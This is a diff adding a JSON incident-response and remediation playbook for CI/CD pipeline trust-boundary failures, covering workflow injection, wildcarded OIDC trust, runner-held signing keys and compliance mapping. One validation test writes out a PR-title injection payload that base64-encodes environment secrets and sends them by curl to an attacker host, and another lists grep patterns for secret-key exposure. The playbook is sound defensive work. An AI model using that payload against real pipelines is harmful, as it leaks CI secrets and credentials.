+        "theater_verdict_if_gap": "Org demonstrates SLSA-style attestations, signed releases, change-tracking — but the workflows accept fork-PR injection, OIDC trust is org-wide, or the signing root is the runner. Either (a) add workflow-injection + OIDC-policy + signing-root conformance tests to the SR-3 / SA-15 evidence package, (b) migrate to ephemeral runners + per-repo OIDC subs + developer-custody signing keys, OR (c) generate a defensible exception via policy-exception-gen."
+      },
+      "framework_gap_mapping": [
+        {
+          "finding_id": "cicd-pipeline-trust-failure",
+          "framework": "nist-800-53",
+          "claimed_control": "SR-3 — Supply Chain Controls and Processes",
+          "actual_gap": "Treats operator's own build platform as out-of-scope. Self-hosted runner compromise satisfies SR-3 trivially.",
+          "required_control": "Extend SR-3 to operator-owned build platform: runner-fleet inventory, ephemerality requirement, workflow-injection sink scan, OIDC sub-pinning."
+        },
+        {
+          "finding_id": "cicd-pipeline-trust-failure",
+          "framework": "nist-800-53",
+          "claimed_control": "SA-15 — Development Process, Standards, and Tools",
+          "actual_gap": "Covers methodology but not runner trust posture or OIDC sub discipline.",
+          "required_control": "Add explicit requirements: (a) ephemeral runners for fork-PR workflows, (b) per-repo + per-branch + per-environment OIDC sub pinning, (c) SHA-pinned Actions with Dependabot-tracked SHA updates."
+        },
+        {
+          "finding_id": "cicd-pipeline-trust-failure",
+          "framework": "iso-27001-2022",
+          "claimed_control": "A.8.30 — Outsourced development",
+          "actual_gap": "Does not bind to operator's own build pipeline.",
+          "required_control": "Add an operator-owned-build-platform variant covering runner-fleet trust + workflow-injection prevention + signing-key custody discipline."
+        },
+        {
+          "finding_id": "cicd-pipeline-trust-failure",
+          "framework": "iso-27001-2022",
+          "claimed_control": "A.8.31 — Separation of development, test, and operational environments",
+          "actual_gap": "Does not extend to runner-fleet separation. Shared runner pool processing stage + prod satisfies A.8.31.",
+          "required_control": "Require per-environment runner pools with cross-pool secret isolation. The runner is itself an environment."
+        },
+        {
+          "finding_id": "cicd-pipeline-trust-failure",
+          "framework": "nis2",
+          "claimed_control": "Art.21(2)(j) — Policies and procedures for software development",
+          "actual_gap": "Process-only; does not specify runner-fleet inventory, workflow-injection sink analysis, or per-environment OIDC sub-pinning.",
+          "required_control": "Mandate documented runner-fleet inventory + quarterly workflow-injection scan + per-environment OIDC sub binding for any essential-entity software-development pipeline."
+        },
+        {
+          "finding_id": "cicd-pipeline-trust-failure",
+          "framework": "soc2",
+          "claimed_control": "CC8.1 — Change management",
+          "actual_gap": "Tracks code change but not the runner that performs the deploy. Compromised runner forges change record itself.",
+          "required_control": "Add runner-fleet conformance + signing-root conformance to the CC8.1 evidence package."
+        }
+      ],
+      "escalation_criteria": [
+        {
+          "condition": "rwep >= 90 AND blast_radius_score >= 4",
+          "action": "page_on_call"
+        },
+        {
+          "condition": "runner-scoped-signing-key == fired OR (workflow-injection-sink == fired AND blast_radius_score >= 4)",
+          "action": "trigger_playbook",
+          "target_playbook": "sbom"
+        },
+        {
+          "condition": "wildcarded-oidc-sub-claim == fired AND cloud_role_permission_includes_write_to_prod == true",
+          "action": "trigger_playbook",
+          "target_playbook": "cred-stores"
+        },
+        {
+          "condition": "self-hosted-runner-non-ephemeral == fired",
+          "action": "trigger_playbook",
+          "target_playbook": "hardening"
+        },
+        {
+          "condition": "compliance_theater_check.verdict == 'theater' AND jurisdiction_obligations contains 'EU'",
+          "action": "notify_legal"
+        }
+      ]
+    },
+    "validate": {
+      "remediation_paths": [
+        {
+          "id": "close-workflow-injection-sinks",
+          "description": "Patch every workflow-injection sink: refactor `${{ ... }}` references inside `run:` / `script:` bodies into env-pinned variables. Replace `pull_request_target` triggers with `pull_request` where possible; where `pull_request_target` is necessary, drop the PR-head checkout step or gate behind a trusted-author check.",
+          "preconditions": [
+            "workflow_files_are_operator_owned == true",
+            "deploy_window_within_72h == true"
+          ],
+          "priority": 1,
+          "compensating_controls": [
+            "env_pinning_lint_added_to_ci",
+            "fork_pr_workflow_blocked_until_remediated"
+          ],
+          "estimated_time_hours": 6
+        },
+        {
+          "id": "pin-actions-by-sha",
+          "description": "Repin every `uses:` reference to a 40-char SHA. Configure Dependabot or Renovate to track SHA updates with a maintenance cadence aligned to the upstream action's release pattern.",
+          "preconditions": [
+            "dependabot_or_renovate_configured == true",
+            "ci_throughput_can_absorb_pin_updates == true"
+          ],
+          "priority": 2,
+          "compensating_controls": [
+            "sha_pin_drift_alert_configured",
+            "maintenance_cadence_recorded_in_change_management"
+          ],
+          "estimated_time_hours": 4
+        },
+        {
+          "id": "tighten-oidc-trust-policies",
+          "description": "Narrow every wildcarded OIDC trust policy to the minimum (repo, branch, environment) scope each cloud role actually requires. For production roles: pin `sub` to `repo:<org>/<repo>:environment:production` AND require the corresponding GitHub Environment with a manual-approval gate.",
+          "preconditions": [
+            "operator_admin_on_cloud_iam == true",
+            "production_environments_can_be_introduced_to_ci_workflow == true"
+          ],
+          "priority": 3,
+          "compensating_controls": [
+            "oidc_trust_policy_recorded_in_iac",
+            "environment_approval_gate_active"
+          ],
+          "estimated_time_hours": 8
+        },
+        {
+          "id": "move-signing-trust-off-runners",
+          "description": "Migrate release-signing from runner-loaded private keys to developer-custody (signed commits the runner verifies) or keyless-via-OIDC (cosign keyless, sigstore-python with short-lived OIDC certs). Keep the runner-side key only as a registry-side proof, not the trust root.",
+          "preconditions": [
+            "developer_signing_workflow_can_be_introduced == true",
+            "downstream_consumers_can_verify_keyless_or_developer_signature == true"
+          ],
+          "priority": 3,
+          "compensating_controls": [
+            "signing_trust_documented_in_release_runbook",
+            "verification_step_added_to_runner_workflow"
+          ],
+          "estimated_time_hours": 12
+        },
+        {
+          "id": "make-self-hosted-runners-ephemeral",
+          "description": "Reconfigure self-hosted runner pool for `ephemeral: true` (GitHub) / `--once` (GitLab) / k8s pod-per-job. Pair with runner-image baseline so each job starts from a known-clean state.",
+          "preconditions": [
+            "runner_orchestration_supports_ephemerality == true",
+            "ci_throughput_can_absorb_per_job_startup_cost == true"
+          ],
+          "priority": 3,
+          "compensating_controls": [
+            "ephemeral_runner_orchestration_recorded_in_iac",
+            "runner_image_provenance_tracked"
+          ],
+          "estimated_time_hours": 10
+        },
+        {
+          "id": "policy-exception",
+          "description": "Generate auditor-ready policy exception when faster paths are blocked.",
+          "preconditions": [
+            "remediation_paths[1..5] partially blocked",
+            "ciso_acceptance_obtainable == true"
+          ],
+          "priority": 6,
+          "compensating_controls": [
+            "enhanced_pipeline_log_review",
+            "weekly_runner_fleet_audit"
+          ],
+          "estimated_time_hours": 6
+        }
+      ],
+      "validation_tests": [
+        {
+          "id": "injection-payload-rejected",
+          "test": "Submit a fork PR with a title containing `';curl attacker-controlled-host/$(printenv | base64);'` (or equivalent shell-metacharacter payload). Confirm no outbound request is made by the runner.",
+          "expected_result": "Runner does not make the outbound request; workflow either rejects the PR or executes safely with the title treated as data.",
+          "test_type": "exploit_replay"
+        },
+        {
+          "id": "oidc-trust-policy-pinned",
+          "test": "Attempt to assume the production cloud role from a workflow running in a NON-production branch or repo. Confirm STS denies.",
+          "expected_result": "STS denies with `not authorized to perform sts:AssumeRoleWithWebIdentity` due to sub-claim mismatch.",
+          "test_type": "negative"
+        },
+        {
+          "id": "action-sha-pin-immutable",
+          "test": "Compare the `uses:` reference SHA in the current workflow against the SHA recorded at the last release. Confirm no drift without a recorded Dependabot / Renovate update PR.",
+          "expected_result": "All `uses:` SHAs match the recorded baseline OR have a tracked update PR.",
+          "test_type": "regression"
+        },
+        {
+          "id": "signing-key-not-on-runner",
+          "test": "Grep the workflow YAML for any `gpg --import` / `cosign import-key-pair` / `echo ${{ secrets.*_PRIVATE_KEY }}` against secrets named for a signing key. Confirm only keyless or developer-custody patterns remain.",
+          "expected_result": "No private-key import from runner secret; keyless or developer-signature-verification only.",
+          "test_type": "negative"
+        },
+        {
+          "id": "ephemeral-runner-confirmed",
+          "test": "For each self-hosted runner, inspect the registration metadata for `ephemeral=true` (GitHub `gh api /repos/{}/actions/runners`), `--once` flag presence (GitLab), or container-per-job orchestration (k8s).",
+          "expected_result": "All self-hosted runners that accept fork-PR workloads are ephemeral.",
+          "test_type": "functional"
+        }
+      ],
+      "residual_risk_statement": {
+        "risk": "CI/CD pipeline + runner + OIDC + signing-key trust boundary contains gaps that cannot be closed within the jurisdiction's notification window.",
+        "why_remains": "Either (a) a legacy workflow depends on `pull_request_target` semantics with PR-head checkout that cannot be refactored without breaking the contributor experience, (b) the cloud provider's trust-policy condition language does not support a needed pin granularity, (c) developer-custody signing requires a contributor workflow migration the team has not yet completed, OR (d) self-hosted runner ephemerality is blocked by a stateful build-cache dependency.",
+        "acceptance_level": "ciso",
+        "compensating_controls_in_place": [
+          "enhanced_pipeline_log_review",
+          "weekly_runner_fleet_audit",
+          "fork_pr_workflow_blocked_for_high_blast_radius_jobs"
+        ]
+      },
+      "evidence_requirements": [
+        {
+          "evidence_type": "config_diff",
+          "description": "Diff of workflow YAML showing env-pinning + SHA-pinning + signing-trust changes, plus the change-management approval reference.",
+          "retention_period": "audit_cycle",
+          "framework_satisfied": [
+            "nist-800-53-SR-3",
+            "nist-800-53-SA-15",
+            "iso-27001-2022-A.8.30",
+            "soc2-cc8.1"
+          ]
+        },
+        {
+          "evidence_type": "exploit_replay_negative",
+          "description": "Injection-payload-rejected test results showing the workflow no longer executes attacker-supplied PR title content.",
+          "retention_period": "1_year",
+          "framework_satisfied": [
+            "soc2-cc8.1",
+            "iso-27001-2022-A.8.30"
+          ]
+        },
+        {
+          "evidence_type": "scan_report",
+          "description": "Runner-fleet inventory + OIDC trust policy snapshot before + after remediation.",
+          "retention_period": "1_year",
+          "framework_satisfied": [
+            "nist-800-53-SR-3",
+            "nis2-art21-2j"
+          ]
+        },
+        {
+          "evidence_type": "attestation",
+          "description": "Signed exceptd attestation file with evidence_hash, pipeline inventory pre/post, RWEP at detection, RWEP post-remediation, residual risk acceptance.",
+          "retention_period": "7_years",
+          "framework_satisfied": [
+            "nist-800-53-CA-7",
+            "iso-27001-2022-A.5.36",
+            "nis2-art21-2j"
+          ]
+        }
+      ],
+      "regression_trigger": [
+        {
+          "condition": "new_workflow_file_added == true",
+          "interval": "on_event"
+        },
+        {
+          "condition": "runner_registration_changed == true",
+          "interval": "on_event"
+        },
+        {
+          "condition": "oidc_trust_policy_changed == true",
+          "interval": "on_event"
+        },
+        {
+          "condition": "weekly",
+          "interval": "7d"
+        }
+      ]
+    },
+    "close": {
+      "evidence_package": {
+        "bundle_format": "csaf-2.0",
+        "contents": [
+          "all_validation_tests_passed",
+          "workflow_yaml_diff",
+          "runner_fleet_inventory",
+          "oidc_trust_policy_inventory",
+          "signing_trust_diagram",
+          "residual_risk_statement",
+          "framework_gap_mapping",
+          "compliance_theater_verdict",
+          "attestation"
+        ],
+        "destination": "local_only",
+        "signed": true
+      },
+      "learning_loop": {
+        "enabled": true,
+        "lesson_template": {
+          "attack_vector": "CI/CD pipeline trust-boundary failure — $finding_class (e.g. workflow-injection-sink, wildcarded-oidc-sub-claim, runner-scoped-signing-key, actions-floating-tag-pin).",
+          "control_gap": "Supply-chain + change-management controls treated the operator's own build platform as out-of-scope OR specified process without binding to runner-fleet trust posture, workflow-injection prevention, or signing-root custody.",
+          "framework_gap": "NIST SR-3 + SA-15, ISO A.8.30 + A.8.31, NIS2 Art.21(2)(j), SOC 2 CC8.1 all underspecify the build-platform trust boundary. SLSA L3 is the closest match but adoption is voluntary.",
+          "new_control_requirement": "Extend each framework's relevant control to operator-owned build platform: ephemeral runners for fork-PR workflows, per-repo + per-branch + per-environment OIDC sub pinning, SHA-pinned Actions with maintenance-bot updates, developer-custody or keyless-via-OIDC signing trust."
+        },
+        "feeds_back_to_skills": [
+          "supply-chain-integrity",
+          "framework-gap-analysis",
+          "compliance-theater",
+          "zeroday-gap-learn"
+        ]
+      },
+      "notification_actions": [
+        {
+          "obligation_ref": "EU/NIS2 Art.23 24h",
+          "deadline": "computed_at_runtime",
+          "recipient": "internal_legal",
+          "evidence_attached": [
+            "runner_fleet_inventory",
+            "compromised_artefact_assessment",
+            "oidc_trust_policy_dump"
+          ],
+          "draft_notification": "Initial NIS2 Art.23 24-hour early-warning notification: CI/CD pipeline trust-boundary compromise. Indicators fired: ${fired_indicator_ids}. Affected runners: ${affected_runner_count}. Cloud roles in scope: ${affected_role_count}. Containment in place: ${containment_record}. Full incident assessment to follow within 72 hours per Art.23(4)."
+        },
+        {
+          "obligation_ref": "EU/DORA Art.19 4h",
+          "deadline": "computed_at_runtime",
+          "recipient": "internal_legal",
+          "evidence_attached": [
+            "ict_third_party_dependencies",
+            "containment_record"
+          ],
+          "draft_notification": "DORA Art.19 initial notification: Major ICT-related incident — CI/CD pipeline compromise affecting build platform for ICT services. Affected ICT third-party dependencies: ${ict_third_party_dependencies}. Full classification + impact assessment to follow within statutory windows."
+        },
+        {
+          "obligation_ref": "EU/EU CRA Art.14 24h",
+          "deadline": "computed_at_runtime",
+          "recipient": "internal_legal",
+          "evidence_attached": [
+            "actively_exploited_assessment",
+            "user_notification_draft"
+          ],
+          "draft_notification": "EU CRA Art.14 notification: actively-exploited vulnerability in our build pipeline. Pipeline outputs ${affected_artefact_inventory} potentially compromised. User-notification draft attached for review."
+        }
+      ],
+      "exception_generation": {
+        "trigger_condition": "remediation_blocked == true OR (provider_does_not_expose_required_primitive == true AND alternative_provider_migration_eta > jurisdiction_window)",
+        "exception_template": {
+          "scope": "CI/CD pipeline trust-boundary residual risk across ${affected_workflow_count} workflow(s) + ${affected_runner_count} runner(s).",
+          "duration": "until_provider_primitive_available_or_30d",
+          "compensating_controls": [
+            "enhanced_pipeline_log_review",
+            "weekly_runner_fleet_audit",
+            "fork_pr_workflow_blocked_for_high_blast_radius_jobs",
+            "release_artifact_post_publish_signature_verification"
+          ],
+          "risk_acceptance_owner": "ciso",
+          "auditor_ready_language": "Pursuant to ${framework_id} ${control_id}, the organisation documents a time-bound risk acceptance for CI/CD pipeline trust-boundary findings across ${affected_workflow_count} workflow(s) and ${affected_runner_count} runner(s). Provider-side primitive availability: ${provider_primitive_status}. Alternative-provider migration ETA: ${migration_eta}. Compensating controls in place: ${compensating_controls}. Residual RWEP post-compensation: ${rwep_post_compensation}. Risk accepted by ${ciso_name} on ${acceptance_date}. Time-bound until ${duration_expiry}. The exception will be re-evaluated on (a) provider primitive availability, (b) the listed expiry date, OR (c) a new exploitation indicator firing — whichever is first."
+        }
+      },
+      "regression_schedule": {
+        "next_run": "computed_at_runtime",
+        "trigger": "both",
+        "notify_on_skip": true
+      }
+    }
+  },
+  "directives": [
+    {
+      "id": "all-pipelines-and-runners",
+      "title": "Inventory + audit every CI workflow, runner, OIDC trust policy, and signing-key reference",
+      "applies_to": {
+        "always": true
+      }
+    },
+    {
+      "id": "tj-actions-class-recheck",
+      "title": "Targeted recheck for tj-actions-class third-party Action compromise exposure",
+      "applies_to": {
+        "attack_technique": "T1195.002"
+      },
+      "phase_overrides": {
+        "direct": {
+          "rwep_threshold": {
+            "escalate": 80,
+            "monitor": 55,
+            "close": 25
+          }
+        }
+      }
+    },
+    {
+      "id": "xz-class-build-injection",
+      "title": "Targeted scan for build-time-only injection patterns (xz-utils CVE-2024-3094 class)",
+      "applies_to": {
+        "cve": "CVE-2024-3094"
+      }
+    }
+  ]
+}
